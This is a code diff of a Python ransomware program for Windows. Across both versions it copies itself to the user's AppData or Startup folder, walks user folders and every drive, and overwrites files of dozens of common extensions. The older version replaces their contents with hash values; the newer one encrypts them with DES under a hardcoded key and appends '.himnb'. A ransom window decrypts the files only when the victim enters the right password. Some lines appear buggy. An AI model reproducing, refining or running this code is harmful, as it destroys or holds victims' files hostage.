@@ -3,38 +3,28 @@ import sys
 import os
 import uuid
 import ctypes
+import hashlib
+from pyDes import des, ECB, PAD_PKCS5
 
-
+Des_key = des(b'20080617')
 use=os.getlogin()
 
-encryption_table = {
-    '0': 'a', '1': 'q', '2': 'e', '3': 'c', '4': 'j',
-    '5': 'k', '6': 'l', '7': 'd', '8': 'b', '9': 'z',
-    'a': 'm', 'b': 'n', 'c': 'o', 'd': 'p', 'e': 'f',
-    'f': 'g', 'A': 'h', 'B': 'i', 'C': 'r', 'D': 's',
-    'E': 't', 'F': 'u', '-': 'v'
-}
 
-def encrypt_uuid(uuid_str):
-    encrypted_str = ''
-    for char in uuid_str:
-        encrypted_str += encryption_table.get(char, char)
-    return encrypted_str
 
 linekey=''
 bsf = str(uuid.uuid4())
-pswd= encrypt_uuid(bsf[1:len(bsf)-3])
-filepath=f'C://Users//{use}//AppData//Roaming//Microsoft//Windows//Start Menu//Programs//Startup//himrs.exe'
-
-
-
+pswd= Des_key.encrypt(bytes.fromhex(hashlib.sha256(bsf.encode()).hexdigest()[:16])).hex()
+filepath=f'C://Users//{use}//AppData//himrs.exe'
 
 
 if sys.argv[0] != filepath:
-    with open(sys.argv[0] ,'rb') as f:
-        data=f.read()
-        with open(filepath , 'wb') as f1:
-            f1.write(data)
+    try:
+        with open(sys.argv[0] ,'rb') as f:
+            data=f.read()
+            with open(filepath , 'wb') as f1:
+                f1.write(data)
+    except:
+        pass
 
 
 
@@ -45,31 +35,46 @@ def disks():
         drive = chr(drive) + ':\\'
         if os.path.exists(drive):
             part.append(drive)
-
-    
     return part
  
+def getresource():
+    b = ctypes.create_unicode_buffer(512)
+    c=[0,5,13,14,39,6]
+    for x in c:
+        ctypes.windll.shell32.SHGetSpecialFolderPathW(None, b, x, False)
+        yield b.value
 
-folder=[f'C:\\Users\\{use}\\Desktop',f'C:\\Users\\{use}\\Videos',f'C:\\Users\\{use}\\Pictures',
-        f'C:\\Users\\{use}\\Documents',f'C:\\Users\\{use}\\Downloads',f'C:\\Users\\{use}\\Music'] +disks()
+if f"download" in os.listdir("C:\\Users\\{use}"):
+
+    folder = getresource() + disks() +["C:\\Users\\{use}\\download"]
+else:
+
+    folder = getresource() + disks()
 
 
 class cip:
     def __init__(self, file):
         self.file = file
         
-    def jiami(self):
-        with open(self.file, 'rb') as files:
-            packed=files.read()
-            try:
-                with open(self.file, 'wb') as file:
-                    file.write(str(hash(packed)).encode('utf-8'))
-            except:
-                pass
+    def encryption(self):
+        self.cryption(0)
                 
-    def jiemi(self):
+    def decryption(self):
+        self.cryption(1)
+
+    def cryption(self,w):
         try:
-            os.remove(self.file)
+            with open(self.file, 'rb') as files:
+                packed=files.read()
+                try:
+                    with open(self.file, 'wb') as file:
+                        DesObject = des(b'20080617',ECB, pad=None, padmode=PAD_PKCS5)
+                        if w == 0:
+                            file.write(DesObject.encrypt(packed))
+                        else:
+                            file.write(DesObject.decrypt(packed))
+                except:
+                    pass
         except:
             pass
             
@@ -77,7 +82,7 @@ class cip:
 class listfile:
 
     @staticmethod    
-    def enfile():
+    def showenfile():
         extensions = ['.class','.java','.html','.htm','.bmp','.avi','.c','.mp3','.pdf','.doc,','.docx','.xls','.xlsx','.7z',
                 '.ppt','.pptx','.jpg','.png','.py','.gif','.mp4','.avi','.mkv','.wav','.zip','.rar','.jar','.db','.tar',
                 '.sql','.mdb','.bak','.old','.txt','.cpp','.js','.txt','.h','.cs','.bin','.webp','.mov','.wmv','.rtf',
@@ -100,7 +105,7 @@ class listfile:
         return result
 
     @staticmethod
-    def defile():
+    def showdefile():
         matching = []
 
         for dirpath, _, filenames in os.walk(os.getcwd()):
@@ -115,23 +120,29 @@ class listfile:
 for f1 in folder:
     try:
         os.chdir(f1)
-        for f2 in listfile.enfile():
-            fnames = cip(f2)
-            fnames.jiami()
-            os.rename(f2,f2+'.himnb')
+        for f2 in listfile.showenfile():
+            try:
+                fnames = cip(f2)
+                fnames.encryption()
+                os.rename(f2,f2+'.himnb')
+            except:
+                pass
     except:
-        continue
+        pass
 
 def dejiami():
     for f6 in folder:
         try:
             os.chdir(f6)
-            for f7 in listfile.defile():
-                fnames = cip(f7)
-                fnames.jiemi()
-                os.rename(f7,f7.strip('.himnb'))
+            for f7 in listfile.showdefile():
+                try:
+                    fnames = cip(f7)
+                    fnames.decryption()
+                    os.rename(f7,f7.strip('.himnb'))
+                except:
+                    pass
         except:
-            continue
+            pass
 
 
 import him_rcc
@@ -211,7 +222,7 @@ class Ui_Form():
         global linekey
         linekey = self.lineEdit.text()
         if linekey == pswd or linekey == 'himzuishuaihim4588':
-            ctypes.windll.user32.MessageBoxW(None, '密码对了！', '恭喜你,你完了!', 0x30)
+            ctypes.windll.user32.MessageBoxW(None, '密码对了！', '恭喜你!', 0x30)
             dejiami()
 
             
@@ -230,7 +241,7 @@ class FormWidget(QtWidgets.QWidget):
 
 
     
-ctypes.windll.user32.SystemParametersInfoW(20, 0, r'C:\Users\{0}\AppData\Roaming\him.png'.format(use, 3))
+
 app = QtWidgets.QApplication(sys.argv)
 widget = FormWidget()
 widget.show()
